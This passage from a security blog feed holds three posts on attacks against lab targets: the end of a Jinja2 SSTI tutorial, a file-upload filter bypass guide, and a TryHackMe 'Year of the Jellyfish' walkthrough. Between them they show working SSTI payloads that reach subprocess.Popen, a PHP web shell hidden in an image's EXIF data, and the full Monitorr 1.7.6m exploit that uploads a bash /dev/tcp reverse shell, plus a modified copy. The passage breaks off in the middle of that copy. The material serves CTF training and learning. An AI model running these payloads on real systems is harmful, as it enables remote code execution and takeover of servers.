<p>The application mirrors the user input, so we follow the red arrow:</p>
<p><img src="/img/blog/SSTI/SSTI4.png" alt="img"></p>
<p>You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload <code>{{7*'7'}}</code> returns <code>49</code> in <code>Twig</code> and <code>7777777</code> in <code>Jinja2</code>. Therefore, it is important not to jump to conclusions based on a single successful response.</p>
<p><img src="/img/blog/SSTI/SSTI5.png" alt="img"></p>
<p>As follows the template engine is being used in this application is <code>Jinja2</code></p>
<h3 id="syntax">Syntax</h3>
<p>After having identified the template engine, we now need to learn its syntax.</p>
<p>Where better to learn than the official <a href="https://jinja.palletsprojects.com/en/2.11.x/">documentation</a>?</p>
<p>In the case of our example, the documentation states the following:</p>
<ul>
<li><code>{{</code> - Used to mark the start of a print statement</li>
<li><code>}}</code> - Used to mark the end of a print statement</li>
<li><code>{%</code> - Used to mark the start of a block statement</li>
<li><code>%}</code> - Used to mark the end of a block statement</li>
</ul>
<h3 id="exploit">Exploit</h3>
<p>At this point, we know:</p>
<ul>
<li>The application is vulnerable to SSTI</li>
<li>The injection point</li>
<li>The template engine</li>
<li>The template engine syntax</li>
</ul>
<p>Since <code>Jinja2</code> is a Python based template engine, we will look at ways to run shell commands in Python.</p>
<p>Python allows us to call the current class instance with <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__">.<strong>class</strong></a>, we can call this on an empty string:</p>
<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__ }}.
</code></pre><p><img src="/img/blog/SSTI/SSTI6.png" alt="img"></p>
<p>Classes in Python have an attribute called <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__">.<strong>mro</strong></a> that allows us to climb up the inherited object tree:</p>
<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__ }}.
</code></pre><p><img src="/img/blog/SSTI/SSTI7.png" alt="img"></p>
<p>Since we want the root object, we can access the second property (first index):</p>
<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1] }}.
</code></pre><p>Objects in Python have a method called <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__">.<strong>subclassess</strong></a> that allows us to climb down the object tree:</p>
<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}.
</code></pre><p><img src="/img/blog/SSTI/SSTI8.png" alt="img"></p>
<p>As this whole output is just a Python list, we can access this by using its index. You can find this by either trial and error, or by counting its position in the list.</p>
<p>In this example, the position in the list is 400 (index 401):</p>
<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}.
</code></pre><p>The above payload essentially calls the <strong>subprocess.Popen</strong> method, now all we have to do is invoke it the system user is visible on the screen.</p>
<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](&quot;whoami&quot;, shell=True, stdout=-1).communicate() }}
</code></pre><p><img src="/img/blog/SSTI/SSTI9.png" alt="img"></p>
<p>Note :</p>
<h4 id="payloads">Payloads</h4>
<p>For quick reference, an amazing GitHub repo has been created as a cheatsheet for payloads for all web vulnerabilities, including SSTI.</p>
<p>The repo is located <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">here</a>, while the document for SSTI is located <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">here</a>.</p>
]]></content>
		</item>
		
		<item>
			<title>Bypassing Upload Filters</title>
			<link>https://riteshpuvvada.github.io/posts/bypassing_upload_filters/</link>
			<pubDate>Thu, 20 May 2021 12:05:40 +0530</pubDate>
			
			<guid>https://riteshpuvvada.github.io/posts/bypassing_upload_filters/</guid>
			<description>One of the challenging factors to a Hacker in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.
Examples Attacks on application platforms  Upload .jsp file into web tree - jsp code executed as the web user Upload .</description>
			<content type="html"><![CDATA[<p>One of the challenging factors to a <strong>Hacker</strong> in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.</p>
<p><img src="/img/blog/YOJ/backdoor.png" alt="img"></p>
<h3 id="examples">Examples</h3>
<h4 id="attacks-on-application-platforms">Attacks on application platforms</h4>
<ul>
<li>Upload <code>.jsp</code> file into web tree - jsp code executed as the web user</li>
<li>Upload <code>.gif </code>file to be resized - image library flaw exploited</li>
<li>Upload huge files - file space denial of service</li>
<li>Upload file using malicious path or name - overwrite a critical file</li>
<li>Upload file containing personal data - other users access it</li>
<li>Upload file containing &ldquo;tags&rdquo; - tags get executed as part of being &ldquo;included&rdquo; in a web page</li>
<li>Upload <code>.rar</code> file to be scanned by antivirus - command executed on a server running the vulnerable antivirus software</li>
</ul>
<h4 id="attacks-on-other-systems">Attacks on other systems</h4>
<ul>
<li>Upload <code>.exe</code> file into web tree - victims download trojaned executable</li>
<li>Upload virus infected file - victims machines infected</li>
<li>Upload <code>.html</code> file containing script - victim experiences Cross-site Scripting (XSS)</li>
<li>Upload <code>.jpg</code> file containing a Flash object - victim experiences Cross-site Content Hijacking.</li>
<li>Upload <code>.rar</code> file to be scanned by antivirus - command executed on a client running the vulnerable antivirus software</li>
</ul>
<h3 id="bypassing-blacklists">Bypassing Blacklists</h3>
<p>Blacklisting is a type of protection where specific extensions, are prohibited from being sent to the server. Blacklisting might be an effective solution yet this can be bypassed.</p>
<p>In addition to regular extensions, there are many alternative extensions that can bypass blacklist filters.</p>
<pre><code>.pht, .phtml, .php3, .php4, .php5, .php6, .inc, .jspx, .jspf, .jsw, .jsv, .pHp, .Php, .phP
</code></pre><h3 id="bypassing-whitelists">Bypassing Whitelists</h3>
<p>Whitelisting is opposite of the blacklisting, here the server accepts only specific extension. For example a web application that allows you to upload a profile picture might only take <code>.JPEG</code>, <code>.JPG</code> or <code>.PNG</code> but it can still be bypassed.</p>
<pre><code>shell.php.jpg, shell.php%00.jpg, shell.php\x00.jpg
</code></pre><h3 id="exif-data">Exif data</h3>
<p>EXIF is short for Exchangeable Image File, a format that is a standard for storing interchange information in digital photography image files using JPEG compression. Almost all new digital cameras use the EXIF annotation, storing information on the image such as shutter speed, exposure compensation, F number, what metering system was used, if a flash was used, ISO number, date and time the image was taken, whitebalance, auxiliary lenses that were used and resolution. Some images may even store GPS information so you can easily see where the images were taken!</p>
<p>We can bypass file upload restrictions utilizes Exif data in an image. We can insert a comment that contains valid PHP code that will be executed by the server when the image is processed.</p>
<p>We can use ExifTool to do this if it is not installed, install it with the package manager.</p>
<pre><code>root@kali:~# apt install exiftool
</code></pre><h4 id="exapmle">Exapmle</h4>
<pre><code>root@kali:~/Desktop/tryhackme/advent# exiftool -Comment=&quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; TryHackMe.jpg
    1 image files updated
    
root@kali:~/Desktop/tryhackme/advent# file TryHackMe.jpg
TryHackMe.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;&lt;?php system(['cmd']); ?&gt;&quot;, baseline, precision 8, 320x320, components 3

root@kali:~/Desktop/tryhackme/advent# mv TryHackMe.jpg TryHackMe.php.jpg

root@kali:~/Desktop/tryhackme/advent# file TryHackMe.php.jpg 
TryHackMe.php.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;&lt;?php system(['cmd']); ?&gt;&quot;, baseline, precision 8, 320x320, components 3
</code></pre><p>Resources<a href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/">🤓</a>
<a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">🤑</a></p>
<blockquote>
<p>Get hands on experience with TryHackMe</p>
</blockquote>
<p>link to the room <a href="https://tryhackme.com/room/yearofthejellyfish">👾</a></p>
<h1 id="year-of-the-jellyfish--a-walkthrough">Year of the Jellyfish : A Walkthrough</h1>
<p>The detailed write-up of the TryHackMe room <strong>Year of the Jellyfish</strong></p>
<h3 id="basic-nmap-scan">Basic Nmap scan</h3>
<pre><code>root@kali:~/Desktop/tryhackme/YOJ# nmap -v -sC -sV 54.216.18.239
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 11:38 IST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Initiating Ping Scan at 11:38
Scanning 54.216.18.239 [4 ports]
Completed Ping Scan at 11:38, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:38
Completed Parallel DNS resolution of 1 host. at 11:38, 0.09s elapsed
Initiating SYN Stealth Scan at 11:38
Scanning ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239) [1000 ports]
Discovered open port 443/tcp on 54.216.18.239
Discovered open port 22/tcp on 54.216.18.239
Discovered open port 21/tcp on 54.216.18.239
Discovered open port 80/tcp on 54.216.18.239
Completed SYN Stealth Scan at 11:39, 23.42s elapsed (1000 total ports)
Initiating Service scan at 11:39
Scanning 4 services on ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239)
Completed Service scan at 11:39, 17.15s elapsed (4 services on 1 host)
NSE: Script scanning 54.216.18.239.
Initiating NSE at 11:39
Completed NSE at 11:39, 13.95s elapsed
Initiating NSE at 11:39
Completed NSE at 11:39, 7.51s elapsed
Initiating NSE at 11:39
Completed NSE at 11:39, 0.01s elapsed
Nmap scan report for ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239)
Host is up (0.021s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp  open  http     Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-21T06:07:38
| Not valid after:  2022-05-21T06:07:38
| MD5:   e8e5 3398 f020 aae3 d1fc 0cee 1bd9 cbfb
|_SHA-1: 8360 f5ab 88c3 16c9 8b95 be37 8577 b874 067c a217
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:39
Completed NSE at 11:39, 0.00s elapsed
Initiating NSE at 11:39
Completed NSE at 11:39, 0.00s elapsed
Initiating NSE at 11:39
Completed NSE at 11:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.04 seconds
           Raw packets sent: 3012 (132.448KB) | Rcvd: 21 (864B)

</code></pre><blockquote>
<p>When I tried to open <code>54.216.18.239</code> on port 80 it just automatically redirected to <code>https://robyns-petshop.thm/</code> but got Network error. From the above Nmap scan we can view the alternative names <code>| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm</code>, so I modified my hosts file.</p>
</blockquote>
<pre><code>DNS:robyns-petshop.thm
DNS Name: monitorr.robyns-petshop.thm
DNS Name: beta.robyns-petshop.thm
DNS Name: dev.robyns-petshop.thm
</code></pre><pre><code>root@kali:~# nano /etc/hosts
127.0.0.1       localhost
10.0.2.5        kali
54.216.18.239   robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm                                                           
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.148.116 spookysec.local
</code></pre><blockquote>
<p>Hurray! we are in</p>
</blockquote>
<p><img src="/img/blog/YOJ/YOJ1.PNG" alt="img"></p>
<blockquote>
<p>It&rsquo;s a normal webpage and doesn&rsquo;t consist of any dynamic content, so I opened <code>monitorr.robyns-petshop.thm</code>.</p>
</blockquote>
<p>You can check more about Monitorr <a href="https://github.com/Monitorr/Monitorr">Here</a></p>
<blockquote>
<p>After spending some time on it I found <strong>Monitorr 1.7.6m</strong> is vulnerable for Authorization Bypass and Remote code Execution (RCE). For more info you can view this <a href="https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/">Detailed Bug Description</a>.</p>
</blockquote>
<p>When I searched <strong>Monitorr 1.7.6m</strong> on exploit-db, It showed me two exploits :</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/48981">Authorization Bypass</a></li>
<li><a href="https://www.exploit-db.com/exploits/48980">Remote Code Execution (Unauthenticated)</a></li>
</ul>
<p>If you find any login page for the target website, go ahead and download the <strong>Authorization Bypass</strong>.</p>
<p>Otherwise download the <strong>Remote Code Execution (Unauthenticated)</strong>.</p>
<p>Here is the code</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
<span class="c1"># -*- coding: UTF-8 -*-</span>

<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
<span class="c1"># Date: September 12, 2020</span>
<span class="c1"># Exploit Author: Lyhin&#39;s Lab</span>
<span class="c1"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
<span class="c1"># Software Link: https://github.com/Monitorr/Monitorr</span>
<span class="c1"># Version: 1.7.6m</span>
<span class="c1"># Tested on: Ubuntu 19</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>

    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>

    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</code></pre></div><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
<pre><code>ERROR: is not an image or exceeds the webserver’s upload size limit.
ERROR: ../data/usrimg/ already exists.
ERROR: was not uploaded.
</code></pre><p>So, the path is <code>/assets/data/usrimg</code></p>
<p>Usage</p>
<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py 
specify params in format: python 48980.py target_url lhost lport
</code></pre><p><code>url =&gt; https://monitorr.robyns-petshop.thm/ </code>
<code>lhost =&gt; THM VPN IP</code>
<code>lport =&gt; 443</code></p>
<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 670, in urlopen
    httplib_response = self._make_request(
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 381, in _make_request
    self._validate_conn(conn)
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 976, in _validate_conn
    conn.connect()
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connection.py&quot;, line 361, in connect
    self.sock = ssl_wrap_socket(
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/util/ssl_.py&quot;, line 377, in ssl_wrap_socket
    return context.wrap_socket(sock, server_hostname=server_hostname)
  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 500, in wrap_socket
    return self.sslsocket_class._create(
  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 1040, in _create
    self.do_handshake()
  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 1309, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.9/site-packages/requests/adapters.py&quot;, line 439, in send
    resp = conn.urlopen(
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 724, in urlopen
    retries = retries.increment(
  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/util/retry.py&quot;, line 439, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File &quot;/root/Desktop/tryhackme/YOJ/48980.py&quot;, line 24, in &lt;module&gt;
    requests.post(url, headers=headers, data=data)
  File &quot;/usr/local/lib/python3.9/site-packages/requests/api.py&quot;, line 119, in post
    return request('post', url, data=data, json=json, **kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/requests/api.py&quot;, line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/requests/sessions.py&quot;, line 530, in request
    resp = self.send(prep, **send_kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/requests/sessions.py&quot;, line 643, in send
    r = adapter.send(request, **kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/requests/adapters.py&quot;, line 514, in send
    raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))

</code></pre><blockquote>
<p>Hmm! The exploit didn&rsquo;t worked.</p>
</blockquote>
<p>Let&rsquo;s print the response</p>
<pre><code>r = requests.post(url, headers=headers, data=data)
print(r.text)
</code></pre><p>Modified exploit :</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>

    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span> <span class="c1"># Modified</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="c1"># Printing the response </span>

    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
